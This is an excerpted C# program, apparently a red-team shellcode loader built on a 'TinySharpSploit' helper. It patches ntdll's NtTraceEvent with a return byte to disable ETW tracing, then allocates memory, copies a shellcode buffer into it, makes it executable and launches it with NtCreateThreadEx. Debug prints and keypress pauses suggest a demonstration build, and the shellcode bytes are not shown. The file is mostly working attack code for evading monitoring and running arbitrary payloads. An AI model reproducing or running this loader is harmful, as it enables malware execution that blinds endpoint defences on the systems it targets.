...
namespace classicwodinvoke
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            ...
            IntPtr pointer1 = TinySharpSploit.GetLibraryAddress("ntdll.dll", "NtTraceEvent");

            uint oldProtect0 = 0;
            var patch = new byte[] { 0xC3 };

            Console.WriteLine("Before NtTraceEvent patching");
            System.Console.ReadKey();


            // Change memory protection
            IntPtr pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "VirtualProtect");
            DELEGATES.VirtualProtect virtualProtect = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualProtect)) as DELEGATES.VirtualProtect;
            virtualProtect(pointer1, patch.Length, 0x40, out oldProtect0);

            Marshal.Copy(patch, 0, pointer1, patch.Length);


            virtualProtect(pointer1, patch.Length, 0x20, out oldProtect0);

            Console.WriteLine("After NtTraceEvent patching");
            System.Console.ReadKey();
            ...
            pointer = TinySharpSploit.GetLibraryAddress("ntdll.dll", "NtAllocateVirtualMemory");
            ...
            // var regionSize = new IntPtr(shellcode.Length);

            //long cStatus = ntallocatevirtualmemory(hProcess, ref baseAddress, (UInt32)0, ref regionSize, (UInt32)0x00001000 | (UInt32)0x00002000, (UInt32)0x40);

            IntPtr baseAddress = IntPtr.Zero;
            UInt32 regionSize = (UInt32)shellcode.Length;

            ntallocatevirtualmemory(hProcess, ref baseAddress, (UInt32)0, ref regionSize, (UInt32)0x00001000 | (UInt32)0x00002000, (UInt32)0x04);
            Console.WriteLine("[+] Allocated memory addr: 0x" + baseAddress.ToInt64().ToString("x2"));

            // Console.WriteLine($"New space created at {baseAddress} of length {regionSize}. Success: {cStatus == 0}.");
            System.Console.ReadKey();



            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
            Console.WriteLine($"shellcode wrote to the allocated region.");
            System.Console.ReadKey();

            pointer = TinySharpSploit.GetLibraryAddress("ntdll.dll", "NtProtectVirtualMemory");
            ...
            long cStatus = ntprotectvirtualmemory(hProcess, ref baseAddress, ref regionSizePtr, (UInt32)0x20, ref oldProtect);





            Console.WriteLine($"changed memory protection  at {baseAddress} to 0x20. Success: {cStatus == 0}.");
            System.Console.ReadKey();
            ...
            cStatus = ntcreatethreadex(out IntPtr threadHeandle, STRUCTS.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            Console.WriteLine($"Started thread handle {threadHeandle} . Success: {cStatus == 0}.");


            //resume thread

            pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "WaitForSingleObject");
            DELEGATES.WaitForSingleObject waitforsingleobject = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WaitForSingleObject)) as DELEGATES.WaitForSingleObject;
            waitforsingleobject(threadHeandle, 0xFFFFFFFF);
        ...
        public class DELEGATES
        {
            ...
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, UInt32 ZeroBits, ref UInt32 RegionSize, UInt32 AllocationType, UInt32 Protect);
            ...
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate Boolean WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
